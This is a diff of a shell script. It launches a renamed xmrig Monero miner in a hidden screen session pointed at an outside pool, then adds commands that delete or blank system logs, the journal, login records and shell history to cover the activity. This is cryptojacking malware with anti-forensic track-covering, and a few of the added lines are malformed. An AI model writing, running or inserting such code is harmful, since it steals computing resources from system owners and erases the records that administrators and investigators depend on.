@@ -16,3 +16,21 @@ mv xmrig akko
 screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
 sudo pkill akko
 screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
+sudo rm enable_1gb_pages.sh
+sudo rm randomx_boost.sh
+sudo /bin/rm /var/log/alternatives.log
+sudo rm /var/log/auth.log
+sudo rm /var/log/dpkg.log
+sudo rm /var/log/kern.log
+sudo rm -r /var/log/journal
+sudo rm  .bash_history
+sudo bash -c 'echo >/var/log/wtmp'
+sudo bash -c 'echo >/var/log/btmp'
+sudo bash -c 'echo >/var/log/lastlog'
+sudo bash -c echo >/var/log/syslog'
+sudo bash -c 'echo >/var/log/bootstrap.log'
+sudo bash -c 'echo >/var/log/faillog'
+sudo bash -c 'echo /var/log/cloud-init-output.log'
+sudo bash -c 'echo cloud-init.log'
+sudo bash -c 'echo >/var/log/apt/history.log'
+sudo bash -c 'echo >/var/log/apt/term.log'
